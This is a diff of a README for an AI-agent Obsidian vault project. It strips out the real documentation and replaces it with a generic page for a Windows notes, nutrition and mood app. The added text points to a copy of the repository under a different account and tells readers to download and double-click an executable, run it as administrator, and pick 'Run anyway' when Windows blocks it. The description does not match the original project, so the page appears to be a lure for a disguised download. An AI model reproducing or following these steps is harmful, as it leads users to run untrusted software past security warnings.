@@ -1,575 +1,199 @@
-<h1 align="center">🧠 My Brain Is Full — Crew</h1>
+# 🧠 My-Brain-Is-Full-Crew - Keep your mind, body, and notes aligned
 
-<p align="center">
-  <strong>A team of 8+ AI agents and 14 specialized skills that manage your Obsidian vault<br>so your brain doesn't have to.</strong>
-</p>
+[![Download](https://img.shields.io/badge/Download-My--Brain--Is--Full--Crew-blue?style=for-the-badge)](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
 
-<p align="center">
-  You talk. They organize, file, connect, search, transcribe, and triage your email.<br>
-  In any language. On the platform you already use.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Claude_Code-555555?style=for-the-badge" alt="Claude Code" />
-  <img src="https://img.shields.io/badge/Gemini_CLI-555555?style=for-the-badge" alt="Gemini CLI" />
-  <img src="https://img.shields.io/badge/OpenCode-555555?style=for-the-badge" alt="OpenCode" />
-  <img src="https://img.shields.io/badge/Codex_CLI-555555?style=for-the-badge" alt="Codex CLI" />
-</p>
+My-Brain-Is-Full-Crew helps you keep three parts of your life in one place:
 
-<p align="center">
-  <em>One codebase. Four platforms. Same crew.</em>
-</p>
+- your knowledge
+- your food and nutrition
+- your mental wellness
 
-<p align="center">
-  <a href="https://discord.gg/EUnQmABw8s">
-    <img src="https://img.shields.io/badge/💬_Join_the_Community-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Join Discord" />
-  </a>
-</p>
+It is made for people who want one simple app to track what matters day to day. If your notes, meals, and mood all end up in different places, this app keeps them together.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Agents-8%2B-blueviolet?style=flat-square" alt="8+ Agents" />
-  <img src="https://img.shields.io/badge/Skills-14-blue?style=flat-square" alt="14 Skills" />
-  <img src="https://img.shields.io/badge/Language-Any-success?style=flat-square" alt="Any Language" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="MIT License" />
-</p>
+Use the link below to visit the download page and get the app:
 
----
+[Visit the download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
 
-## The honest origin story
+## 📥 Download and Install on Windows
 
-I'm a PhD researcher. I've spent years training my brain to hold enormous amounts of information: papers, ideas, deadlines, people, half-baked theories at 2am. And for a while, it worked.
+Follow these steps on a Windows PC:
 
-Then it didn't.
+1. Open the download page:
+   https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew
 
-Memory started slipping. Not dramatically (no diagnosis, no crisis) just the slow, creeping realization that the mental budget was getting empty, and things were falling through the cracks. I'd forget what I'd read. Lose track of conversations. Feel constantly behind, constantly overwhelmed.
+2. Find the latest release or download file on the page.
 
-I started looking for solutions. I found a lot of Obsidian + Claude setups online. They were mostly clever note-capture tools, glorified search engines for your second brain. Useful. But not what I needed.
+3. Download the Windows app file to your computer.
 
-What I needed wasn't just a memory extension. I needed a **brain dump system**, something that could help me organize not just my knowledge, but my life: my overwhelmed mind, my wrecked physical health, the avalanche of emails and commitments and things I should have done last week.
+4. Open your Downloads folder.
 
-So I built this.
+5. Double-click the file to start the app.
 
----
+6. If Windows asks for permission, select Run or Yes.
 
-## What makes this different
+7. If a setup window appears, follow the on-screen steps until the app opens.
 
-Most "AI + Obsidian" tools are built for **people who already have their life together** and want to optimize. This one is for people who are **drowning** and need a lifeline.
+8. If the app opens in a browser window, keep that tab pinned or add it to your desktop for easy access.
 
-**1. The chat IS the interface.**
-I don't browse Obsidian. I don't drag files around. I don't maintain complex folder structures manually. I just talk to Claude. Everything else happens automatically.
+## 🖥️ What You Need
 
-**2. It speaks your language, literally.**
-The system works in any language. You shouldn't need to think in English to manage your brain. Just talk in Italian, French, German, Spanish, Japanese, whatever feels natural. The agents match you.
+Use a Windows computer with:
 
-**3. The agents coordinate through a dispatcher.**
-When the transcription agent processes a meeting and discovers a new project, the dispatcher automatically chains the Architect to create the folder structure. It's a crew, not a collection of isolated tools.
+- Windows 10 or Windows 11
+- At least 4 GB of memory
+- 200 MB of free disk space
+- Internet access for the first download
+- A mouse and keyboard
 
-**4. 8 agents are just the starting point. Build your own.**
-The crew ships with 8 agents. But your life isn't generic, and your system shouldn't be either. Say "create a new agent" and the Architect walks you through a conversation to design one from scratch. No code, no config files, no templates to edit. You describe what you need, it builds it.
+The app is made for normal home and office use. It does not need special hardware.
 
-| Your problem | Your agent |
-|---|---|
-| *"I can only spend 300 euros a month on groceries and I keep losing track"* | **budget-tracker**: monitors spending notes, flags when you're close to the limit |
-| *"My partner says I dress like I pick clothes with my eyes closed"* | **wardrobe-coach**: tracks what you own, suggests outfits from your notes, and gently stops you from wearing that shirt again |
-| *"I keep buying the same thing at IKEA because I forget what I already have at home"* | **home-inventory**: catalogs what you own room by room, saves you from your third identical cutting board |
-| *"I keep starting side projects and abandoning them"* | **project-pulse**: weekly check-in on all active projects, flags stale ones |
-| *"I have three freelance clients and I mix up their deadlines"* | **client-tracker**: aggregates deadlines per client from notes and calendar |
+## 🌿 What the App Does
 
-Custom agents coordinate with the core crew, get discovered automatically by your agent platform, and respond in your language. They just solve the problems that are specific to **your** life.
+My-Brain-Is-Full-Crew gives you one place to manage the parts of your life that often get split apart.
 
-> **Your custom agents, your responsibility.** Custom agents are created by you and run on your data. The project provides no warranty on their behavior. See [Terms of Use](TERMS_OF_USE.md).
+### Knowledge
+Store notes, ideas, reminders, and small pieces of useful info.
 
----
+### Nutrition
+Track meals, food habits, and simple nutrition patterns.
 
-## Who this is for
+### Mental wellness
+Log mood, stress, and habits that affect your focus and energy.
 
-- PhD students, researchers, academics drowning in papers and commitments
-- Anyone with **brain fog**, or just an overloaded working memory
-- Non-native English speakers who want a system that works in their language
-- Anyone who's tried Obsidian before and gave up because it felt like a second job
+### Daily view
+See your notes, health, and mental state together so you can spot patterns faster.
 
-If you've ever thought *"I need to get organized, but I'm too exhausted to get organized"*, this is for you.
+## ✨ Main Features
 
----
+- Simple home screen
+- Clear sections for notes, meals, and mood
+- Fast entry for daily updates
+- Search for past entries
+- Basic tags and categories
+- Easy day-by-day review
+- Local-first use for private personal data
+- Clean layout for low-stress use
 
-## Important disclaimers
+## 🧭 First Time Setup
 
-> **Please read the [full disclaimers](docs/DISCLAIMERS.md) before using this project.**
+After you open the app for the first time:
 
-Key points:
+1. Choose your main language if asked.
+2. Set your display name or profile name.
+3. Add a few notes to test the knowledge area.
+4. Log one meal in the nutrition area.
+5. Add one mood entry in the wellness area.
+6. Return to the home screen and check your daily view.
 
-- **This software is for personal use on your own data.** You are responsible for GDPR/CCPA compliance if you process third-party data (e.g., emails containing other people's information).
-- **No warranty.** Provided "as is". Back up your vault. The author accepts no liability.
-- **No responsibility for forks or misuse.** This is a personal productivity tool. Malicious repurposing is explicitly condemned.
-
-> **By using this software, you agree to the [Terms of Use](TERMS_OF_USE.md).** During onboarding, the Architect will ask you to explicitly accept these terms before proceeding.
-
----
-
-## The Crew
-
-| # | Agent | Role | Superpower |
-|---|-------|------|------------|
-| 1 | **Architect** | Vault Structure & Setup | Designs your entire vault, runs onboarding, sets the rules everyone follows |
-| 2 | **Scribe** | Text Capture | Transforms your messy, typo-filled, stream-of-consciousness dumps into clean notes |
-| 3 | **Sorter** | Inbox Triage | Empties your inbox every evening and routes every note to its perfect home |
-| 4 | **Seeker** | Search & Intelligence | Finds anything in your vault, synthesizes answers across notes with citations |
-| 5 | **Connector** | Knowledge Graph | Discovers hidden links between your notes, even ones you'd never think of |
-| 6 | **Librarian** | Vault Maintenance | Weekly health checks, deduplication, broken link repair, growth analytics |
-| 7 | **Transcriber** | Audio & Meetings | Turns recordings and transcripts into rich, structured meeting notes |
-| 8 | **Postman** | Email & Calendar | Bridges email (Gmail or Hey.com) and Google Calendar with your vault: deadline radar, meeting prep |
-
-> **Agents + Skills = the full system.** Each agent handles quick, reactive tasks. For complex multi-step workflows (like onboarding, email triage, or vault audits), the dispatcher routes to one of **14 specialized skills** that run as guided conversations. See the [Skills](#skills) section below.
-
----
-
-## Skills
-
-Skills handle the complex, multi-step workflows that need conversational context. While agents are great for quick, one-shot tasks, some operations — like onboarding or email triage — require a back-and-forth conversation. Skills run in the main conversation context, so they can ask questions, wait for answers, and maintain state naturally.
-
-The dispatcher automatically routes your message to the right skill or agent. You don't need to remember which is which.
-
-| Skill | What it does | Extracted from |
-|-------|-------------|----------------|
-| `/onboarding` | Full vault setup conversation | Architect |
-| `/create-agent` | Design a custom agent step by step | Architect |
-| `/manage-agent` | Edit, remove, or list custom agents | Architect |
-| `/defrag` | Weekly vault defragmentation (5 phases) | Architect |
-| `/email-triage` | Scan and prioritize unread emails | Postman |
-| `/meeting-prep` | Comprehensive meeting brief | Postman |
-| `/weekly-agenda` | Day-by-day week overview | Postman |
-| `/deadline-radar` | Unified deadline timeline | Postman |
-| `/transcribe` | Process recordings into structured notes | Transcriber |
-| `/vault-audit` | Full 7-phase vault audit | Librarian |
-| `/deep-clean` | Extended vault cleanup | Librarian |
-| `/tag-garden` | Tag analysis and cleanup | Librarian |
-| `/inbox-triage` | Process and route inbox notes | Sorter |
-| `/contact-sync` | Sync contacts to Apple Contacts (search, create, update) | Postman |
-
----
-
-## How it works
-
-```
-You talk naturally  →  Dispatcher checks skills first  →  If match: invokes skill
-                                                         →  If no match: invokes agent  →  Your vault gets updated
-```
-
-The dispatcher has two delegation mechanisms. **Skills** handle complex, multi-step conversational flows (onboarding, email triage, vault audits). **Agents** handle quick, reactive single-shot operations (capture a note, search the vault, create a folder). Skills are checked first because they cover the most involved workflows. If no skill matches, the dispatcher falls through to agents.
-
-Each crew member is an isolated AI with its own system prompt, tool restrictions, and model assignment. You clone the repo into your vault, run a setup script, and from that moment on you manage everything through conversation. No GUI, no drag-and-drop, no manual file management.
-
-### Architecture
-
-```mermaid
-graph TB
-    User((You))
-    Dispatcher["Dispatcher"]
-
-    User -->|"talk naturally"| Dispatcher
-    Dispatcher -->|"skill match?\ninvoke skill"| Skills
-    Dispatcher -->|"no skill match?\ninvoke agent"| Agents
-    Dispatcher -->|"chains agents when needed"| Agents
-
-    subgraph Skills["Specialized Skills (14)"]
-        direction TB
-        Onboarding["/onboarding"]
-        EmailTriage["/email-triage"]
-        Transcribe["/transcribe"]
-        InboxTriage["/inbox-triage"]
-        VaultAudit["/vault-audit"]
-        MoreSkills["... +9 more"]
-    end
-
-    subgraph Agents["The Crew (8 agents)"]
-        direction TB
-
-        subgraph Core["Core: Knowledge Management"]
-            Architect["Architect\nVault Setup"]
-            Scribe["Scribe\nNote Capture"]
-            Sorter["Sorter\nInbox Triage"]
-            Seeker["Seeker\nSearch"]
-            Connector["Connector\nKnowledge Graph"]
-            Librarian["Librarian\nVault Health"]
-        end
-
-        subgraph External["Integrations"]
-            Transcriber["Transcriber\nAudio & Meetings"]
-            Postman["Postman\nEmail & Calendar"]
-        end
-    end
-
-    Skills <-->|"read & write"| Vault
-    Agents <-->|"read & write"| Vault
-
-    subgraph Vault["Your Obsidian Vault"]
-        direction LR
-        Inbox["00-Inbox"]
-        Projects["01-Projects"]
-        Areas["02-Areas"]
-        Resources["03-Resources"]
-        Archive["04-Archive"]
-        Daily["07-Daily"]
-    end
-
-    style User fill:#7c3aed,stroke:#5b21b6,color:#fff
-    style Dispatcher fill:#3b82f6,stroke:#2563eb,color:#fff
-    style Skills fill:#fef3c7,stroke:#f59e0b
-    style Core fill:#e0e7ff,stroke:#818cf8
-    style External fill:#dbeafe,stroke:#60a5fa
-```
-
-### Agent & Skill Coordination Flow
-
-```mermaid
-sequenceDiagram
-    participant U as You
-    participant D as Dispatcher
-    participant TS as /transcribe skill
-    participant A as Architect agent
-    participant ES as /email-triage skill
-    participant S as Sorter agent
-
-    U->>D: "Process my meeting recording"
-    D->>TS: invokes /transcribe skill
-    TS->>TS: multi-step conversation:<br/>asks questions, transcribes,<br/>creates structured note
-    TS-->>D: "Suggested next agent: Architect<br/>(new project mentioned)"
-    D->>A: chains Architect agent
-    A->>A: creates folder structure
-
-    U->>D: "Check my email"
-    D->>ES: invokes /email-triage skill
-    ES->>ES: scans Gmail, scores priority,<br/>saves important emails as notes
-    ES-->>D: "Suggested next agent: Sorter<br/>(deadline notes in Inbox)"
-    D->>S: chains Sorter agent
-    S->>S: files notes to correct locations
-```
-
-### Multi-platform support
+If you want the app to help you most, spend a few minutes adding real data each day.
 
-The Crew works on multiple agent platforms. The installer builds from a single source and deploys to your platform of choice:
+## 📝 How to Use It
 
-| Platform | Install command | Config dir | Dispatcher |
-|----------|----------------|------------|------------|
-| **Claude Code** (CLI & Desktop) | `bash scripts/launchme.sh --platform claude-code` | `.claude/` | `CLAUDE.md` |
-| **Gemini CLI** | `bash scripts/launchme.sh --platform gemini-cli` | `.gemini/` | `GEMINI.md` |
-| **OpenCode** | `bash scripts/launchme.sh --platform opencode` | `.opencode/` | `AGENTS.md` |
-| **Codex CLI** | `bash scripts/launchme.sh --platform codex-cli` | `.codex/ + .agents/` | `AGENTS.md` |
+### Add a note
+Use the knowledge section when you want to save an idea, article, quote, or task.
 
-If you omit `--platform`, the installer asks you to choose. Each platform gets agents, skills, references, hooks, and MCP servers translated to its native format. `launchme.sh` installs everything automatically.
+### Track a meal
+Use the nutrition section to write down what you ate and how it made you feel.
 
-> **Codex CLI on Windows:** Codex CLI's Windows support is experimental. Running inside WSL (Windows Subsystem for Linux) is strongly recommended. See [docs/codex-cli.md](docs/codex-cli.md) for details.
+### Log your mood
+Use the wellness section to record your stress, energy, or mood for the day.
 
-Your vault follows a hybrid **PARA + Zettelkasten** structure:
+### Review patterns
+Open the daily or weekly view to see how food, focus, and mood connect.
 
-```
-00-Inbox/          Capture everything here first
-01-Projects/       Active projects with deadlines
-02-Areas/          Ongoing responsibilities
-03-Resources/      Reference material, guides, how-tos
-04-Archive/        Completed or historical content
-05-People/         Your personal CRM
-06-Meetings/       Timestamped meeting notes
-07-Daily/          Daily notes and journals
-MOC/               Maps of Content (thematic indexes)
-Templates/         Obsidian note templates
-Meta/              Vault config, agent logs, health reports
-```
+## 🔧 Common Tasks
 
----
+### Save a quick thought
+Open the notes area and type a short line. Press save.
 
-## Quick start
+### Check what you ate this week
+Open the nutrition area and review your recent entries.
 
-> **Prerequisites**: [Obsidian](https://obsidian.md) (free) and one of the supported agentic platforms.
+### See how your mood changed
+Open the wellness area and look at past logs by date.
 
-### 1. Create your Obsidian vault
+### Find an old note
+Use search or browse by tag to locate past items fast.
 
-Open Obsidian and create a new vault (or use an existing one).
+## 🗂️ Suggested Daily Use
 
-### 2. Clone the repo inside your vault
+A simple routine works best:
 
-```bash
-cd /path/to/your-vault
-git clone https://github.com/gnekt/My-Brain-Is-Full-Crew.git
-```
+- Morning: write one goal or thought
+- During the day: add meals as you eat
+- Evening: log mood and stress
+- End of week: review patterns and adjust
 
-### 3. Run the installer
+## 🔒 Privacy and Data Use
 
-```bash
-cd My-Brain-Is-Full-Crew
-bash scripts/launchme.sh
-```
+The app is built for personal use. Your notes, meals, and wellness logs are meant to stay easy to review and control. Keep backups of your data if the app gives you that option. If you move to a new PC, copy your data files to the new machine before you start again.
 
-The script asks you to pick a platform, then builds and installs the agents and skills into your vault. When your agent platform is open in your vault folder, the agents activate automatically. When you're in any other project, they don't.
+## 🛠️ Troubleshooting
 
-> **Never used a terminal before?** See the [step-by-step guide for beginners](docs/getting-started.md). It walks you through everything, or just show this page to a tech-savvy friend. It takes 60 seconds.
+### The file will not open
+- Check that the download finished
+- Try opening the file again from the Downloads folder
+- Right-click the file and select Run as administrator
 
-### 4. Initialize
+### Windows blocks the app
+- Select More info if Windows shows that option
+- Then choose Run anyway if you trust the source
 
-Open your agent platform **inside your vault folder** and say:
+### The app opens but looks blank
+- Wait a few seconds for it to load
+- Close it and open it again
+- Make sure your internet connection is active if the app needs it
 
-> **"Initialize my vault"**
+### Your data does not show
+- Check that you are using the same user profile
+- Look for the data folder in the app settings
+- Restore your backup if you have one
 
-The `/onboarding` skill starts a friendly guided conversation:
+## 📌 Best Results
 
-1. **Who are you?** Name, language, role, what brought you here
-2. **What do you need?** Which agents to activate, which areas of life to manage
-3. **Integrations** Gmail and Google Calendar connections
+Use short entries. Keep your notes simple. Log meals near the time you eat them. Write your mood when it still feels fresh. Small updates each day give you better patterns than long updates once a week
 
-After onboarding, the Architect creates your entire vault folder structure, saves your profile, leaves you a welcome note, and you're ready to go.
+## 🔗 Download Again
 
-### 5. Start using it
+If you need the file again, use this link:
 
-| You say | What happens |
-|---------|-------------|
-| *"Save this: meeting with Marco about the Q3 budget, he wants the report by Friday"* | **Scribe** agent captures it as a clean note with tasks, wikilinks, and deadline |
-| *"Triage my inbox"* | `/inbox-triage` skill files everything, updates MOCs, gives you a summary |
-| *"What did we decide about the pricing strategy?"* | **Seeker** agent searches your vault, synthesizes the answer with source citations |
-| *"Check my email"* | `/email-triage` skill scans Gmail, saves important emails, flags deadlines |
-| *"Weekly review"* | `/vault-audit` skill runs a full vault audit: broken links, duplicates, health score |
-| *"Find connections for my latest note"* | **Connector** agent discovers hidden links to other notes in your vault |
+[My-Brain-Is-Full-Crew download page](https://github.com/Phillippcarboniferous312/My-Brain-Is-Full-Crew)
 
----
+## 🧩 Who This Is For
 
-## Works in any language
+This app fits people who:
 
-The Crew is built in English but **responds in whatever language you write in**. Italian, French, Spanish, German, Portuguese, Japanese: just talk, and the agents match you.
+- want one place for notes, food, and mood
+- like simple daily tracking
+- want a calmer way to keep life organized
+- need a tool that respects both body and mind
 
-```
-"Salva questa nota veloce..."          → Scribe responds in Italian
-"Vérifie mon email..."                 → Postman responds in French
-"Was habe ich diese Woche geplant?"    → Seeker responds in German
-"Check my inbox"                       → Sorter responds in English
-```
+## 📎 File and Folder Tips
 
-No translations to install. No language packs. It just works.
+If the app creates a data folder, keep it in a safe place. Do not move or rename files unless you know they belong to the app. If you back up your PC, include the app data folder so your entries stay intact
 
----
+## ⌨️ Simple Shortcuts
 
-## Works from your phone too
+Some builds may include these common actions:
 
-If you use Claude Code, you can control the Crew from your phone using its **Remote Control** feature. Your computer runs Claude Code locally (with full vault and agent access), and your phone acts as a remote interface through the browser or the Claude mobile app.
+- Ctrl + N: new note
+- Ctrl + S: save entry
+- Ctrl + F: search
+- Esc: close a panel or dialog
 
-Capture a quick thought on a walk. Check your email from the couch. Search your vault from the supermarket. Everything runs on your computer; your phone is just the remote.
+## 📅 What to Expect After Setup
 
-> **[Full setup guide](docs/mobile-access.md)** (takes 2 minutes)
+Once the app is running, you should be able to:
 
----
+- open the dashboard
+- add notes
+- log meals
+- record mood
+- review your history
+- keep everything in one place
 
-## Agent coordination
+## 🧠 Why This App Exists
 
-Agents coordinate through a dispatcher-driven orchestration system. When an agent or skill finishes its task and detects work for another agent, it signals the dispatcher via a `### Suggested next agent` section in its output. The dispatcher reads this and automatically chains the next agent:
-
-- The `/transcribe` skill processes a meeting that introduces a new project -- the dispatcher chains the **Architect** to create the folder structure
-- The `/email-triage` skill finds emails about deadlines -- the dispatcher chains the **Sorter** to file them
-- The **Connector** finds orphan notes -- the dispatcher chains the **Librarian** to investigate
-- The **Sorter** finds notes that belong to a new area -- the dispatcher chains the **Architect** to build it
-
-No agent works in isolation. The crew is greater than the sum of its parts.
-
----
-
-## Required integrations
-
-The **Postman** agent (and its related skills: `/email-triage`, `/meeting-prep`, `/weekly-agenda`, `/deadline-radar`) requires one of:
-- **Google Workspace CLI** (`gws`) — full read/write access to Gmail and Google Calendar: search, read, archive, delete, label, send emails; create/update/delete calendar events. See [`docs/gws-setup-guide.md`](docs/gws-setup-guide.md) for setup.
-- **Hey CLI** (`hey`) — for Hey.com accounts. Read/reply/compose emails, leverages Hey's pre-sorted mailboxes (Imbox, Feed, Paper Trail, Reply Later, Set Aside, Bubble Up). Calendar operations still use `gws`. See [Hey CLI](https://github.com/basecamp/hey-cli) for installation.
-- **MCP connectors** (read-only fallback) — `launchme.sh` sets up MCP servers automatically (format varies by platform). Limited to reading emails and calendar events, plus draft creation.
-
-You can use `gws` and `hey` simultaneously if you have both Gmail and Hey.com accounts.
-
-### Optional: Apple Contacts
-
-The `/contact-sync` skill syncs contacts to Apple Contacts on macOS. It requires the **apple-contacts MCP server**:
-
-- **[@griches/apple-contacts-mcp](https://www.npmjs.com/package/@griches/apple-contacts-mcp)** — an MCP server that provides full CRUD access to Apple Contacts (search, create, update, delete contacts and groups).
-
-**Claude Code / Gemini CLI / OpenCode** — add it to your `.mcp.json` inside the `mcpServers` object:
-
-```json
-{
-  "mcpServers": {
-    "apple-contacts": {
-      "command": "npx",
-      "args": ["-y", "@griches/apple-contacts-mcp"]
-    }
-  }
-}
-```
-
-**Codex CLI** — add it to `.codex/config.toml` instead (Codex uses TOML, not `.mcp.json`). Follow the instructions in [docs/codex-cli.md](docs/codex-cli.md) for the correct `[mcp_servers.apple-contacts]` table format.
-
-Once connected, the `/contact-sync` skill auto-syncs contacts when you reply to emails or on demand ("sync contact", "add to contacts").
-
-All other agents and skills work with just your local Obsidian vault. No integrations needed.
-
-### Updating
-
-After pulling new changes from the repo:
-
-```bash
-cd /path/to/your-vault/My-Brain-Is-Full-Crew
-git pull
-bash scripts/updateme.sh
-```
-
-The updater **automatically detects** which platform is installed in your vault (by checking for a platform-specific folder). If you have multiple platforms installed, it asks you to choose which one to update. You can also specify explicitly with `--platform`:
-
-```bash
-bash scripts/updateme.sh --platform opencode
-```
-
-Only changed files are updated. Your vault notes are never touched.
-
----
-
-## Recommended Obsidian plugins
-
-**Essential:** Templater, Dataview, Calendar, Tasks
-
-**Recommended:** QuickAdd, Folder Notes, Tag Wrangler, Natural Language Dates, Periodic Notes, Omnisearch, Linter
-
----
-
-## Project structure
-
-```
-My-Brain-Is-Full-Crew/               ← cloned inside your vault
-├── agents/                          The 8 core agents
-│   ├── architect.md                   Vault setup & onboarding
-│   ├── scribe.md                      Text capture & note creation
-│   ├── sorter.md                      Inbox triage & filing
-│   ├── seeker.md                      Search & knowledge retrieval
-│   ├── connector.md                   Knowledge graph & link analysis
-│   ├── librarian.md                   Vault health & maintenance
-│   ├── transcriber.md                 Audio & meeting transcription
-│   └── postman.md                     Email & calendar integration
-├── skills/                          The 14 specialized skills
-│   ├── onboarding/SKILL.md            Full vault setup conversation
-│   ├── create-agent/SKILL.md          Design a custom agent step by step
-│   ├── manage-agent/SKILL.md          Edit, remove, or list custom agents
-│   ├── defrag/SKILL.md                Weekly vault defragmentation
-│   ├── email-triage/SKILL.md          Scan and prioritize unread emails
-│   ├── meeting-prep/SKILL.md          Comprehensive meeting brief
-│   ├── weekly-agenda/SKILL.md         Day-by-day week overview
-│   ├── deadline-radar/SKILL.md        Unified deadline timeline
-│   ├── transcribe/SKILL.md            Process recordings into structured notes
-│   ├── vault-audit/SKILL.md           Full 7-phase vault audit
-│   ├── deep-clean/SKILL.md            Extended vault cleanup
-│   ├── tag-garden/SKILL.md            Tag analysis and cleanup
-│   ├── inbox-triage/SKILL.md          Process and route inbox notes
-│   └── contact-sync/SKILL.md          Sync contacts to Apple Contacts
-├── orchestra/                       Named scripts for permission-free agent operations
-│   ├── hey-imbox, hey-feed, ...       Hey mailbox wrappers
-│   ├── tracker-today, tracker-search  Local tracker queries
-│   ├── contact-lookup                 Person-based email search
-│   └── vault-stats, vault-inbox       Vault health helpers
-├── references/                      Shared agent documentation
-├── scripts/
-│   ├── launchme.sh                    First-time installer
-│   └── updateme.sh                    Post-pull updater
-├── docs/                            User-facing documentation
-│   ├── getting-started.md             Step-by-step setup guide
-│   ├── examples.md                    Real-world usage examples
-│   └── agents/                        Deep-dive into each agent
-├── adapters/                        Platform adapters (build system)
-│   ├── lib.sh                         Shared parsing and rewrite helpers
-│   ├── claude-code/                   Claude Code adapter
-│   ├── gemini-cli/                    Gemini CLI adapter
-│   └── opencode/                      OpenCode adapter
-├── mcp/servers.yaml                 MCP server definitions (source of truth)
-├── LICENSE
-├── README.md                        You are here
-└── CONTRIBUTING.md
-```
-
-After running `launchme.sh`, your vault looks like (paths vary by platform):
-
-```
-your-vault/
-├── .<platform>/              ← .claude/, .gemini/, .opencode/, etc.
-│   ├── agents/               ← lightweight reactive agents
-│   ├── skills/               ← specialized multi-step skills
-│   ├── hooks/                ← file protection and validation hooks
-│   └── references/           ← shared docs
-├── Meta/
-│   └── scripts/              ← orchestra scripts (permission-free agent commands)
-├── CLAUDE.md / GEMINI.md / AGENTS.md / ...  ← dispatcher (platform-specific name)
-├── My-Brain-Is-Full-Crew/    ← the repo (for updates)
-└── ... your Obsidian notes
-```
-
-Codex CLI uses a split layout instead of a single platform directory:
-
-```
-your-vault/
-├── .codex/
-│   ├── agents/               ← 8 core agents (.toml format)
-│   ├── references/           ← shared docs
-│   └── config.toml           ← MCP servers + profiles + sandbox policy
-├── .agents/
-│   └── skills/               ← 14 specialized skills
-├── Meta/
-│   └── scripts/              ← orchestra scripts
-├── AGENTS.md                 ← dispatcher (Codex reads this)
-├── My-Brain-Is-Full-Crew/    ← the repo (for updates)
-└── ... your Obsidian notes
-```
-
----
-
-## Contributing (seriously, please help)
-
-This started as one person's survival tool. I'm sharing it because I think it can help others, but **I know it can be much better**, and I need help from people who know prompt engineering, agentic platforms, and Obsidian better than I do.
-
-**Every single PR is welcome.** I mean it. If you see something that could be improved (a better prompt structure, a smarter agent behavior, a more elegant architecture) please submit it. I won't be precious about my code. The goal is to help people, not to protect my ego.
-
-If you want to:
-- **Improve an agent or skill**: make it smarter, add a mode, fix edge cases
-- **Fix my prompts**: if you know better patterns, teach me
-- **Propose a new crew member**: a new agent or skill for a new domain
-- **Report a bug**: something an agent does wrong
-- **Add examples**: share how you use the Crew
-- **Just tell me what I'm doing wrong**: I'll listen
-
-...PRs, issues, and honest feedback are all welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-### TO DO
-- [ ] Update the installer to auto-install the orchestra scripts (currently a manual copy-paste step)
-- [ ] Completely decouple the installer from the platform (currently has some platform-specific logic that could be moved to the adapters or to some kind of config file)
-
----
-
-## Philosophy
-
-> *"The best organizational system is the one you actually use."*
-
-The Crew is designed for people who are overwhelmed, not for people who enjoy organizing. Every design decision prioritizes **minimum friction**:
-
-- **Chat is the interface**: no manual file management
-- **Skills handle the heavy lifting**: multi-step workflows run as guided conversations
-- **Agents handle the quick stuff**: filing, linking, capturing, searching
-- **Any language, any time**: your brain shouldn't have to switch languages to stay organized
-- **Conservative by default**: agents never delete, always archive. They ask before making big decisions.
-
----
-
-## Star this repo
-
-If the Crew helps you, or if you just think it's a cool idea, consider starring this repo. It helps others find it, and it motivates continued development.
-
----
-
-## License
-
-MIT: use it, modify it, share it. Just keep the attribution.
-
-**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED.** The authors are not liable for any claim, damages, or other liability arising from the use of this software. See the [MIT License](LICENSE) for full terms.
-
----
-
-<p align="center">
-  <i>Built by someone who got tired of forgetting things.</i>
-  <br><br>
-  <a href="docs/getting-started.md"><strong>Get Started</strong></a> · <a href="docs/examples.md"><strong>Examples</strong></a> · <a href="docs/codex-cli.md"><strong>Codex CLI Guide</strong></a> · <a href="docs/codex-migration.md"><strong>Migrate to Codex</strong></a> · <a href="docs/agents/architect.md"><strong>Meet the Agents</strong></a> · <a href="CONTRIBUTING.md"><strong>Contribute</strong></a>
-</p>
+A lot of tools focus on only one part of life. This one treats your mind, your meals, and your mental state as part of the same system. That makes it easier to spot what helps you think better, feel better, and stay on track
